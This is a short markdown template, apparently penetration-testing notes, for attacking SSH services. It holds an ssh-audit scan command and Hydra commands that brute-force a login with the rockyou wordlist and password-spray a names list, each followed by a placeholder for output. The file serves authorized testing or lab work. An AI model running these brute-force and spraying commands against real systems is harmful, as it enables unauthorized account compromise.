# ssh-audit
## ssh-audit.py $IP_ADDRESS
```
<insert ssh-audit output here>
```
# Hydra (Brute Force SSH Login)
```bash
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ssh://$IP_ADDRESS:$PORT -t 4 -V
```
```
<insert hydra output here>
```
# Password Spraying (if there’s a known password)
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$PASSWORD" ssh://$IP_ADDRESS
```
```
<insert hydra output here>
```
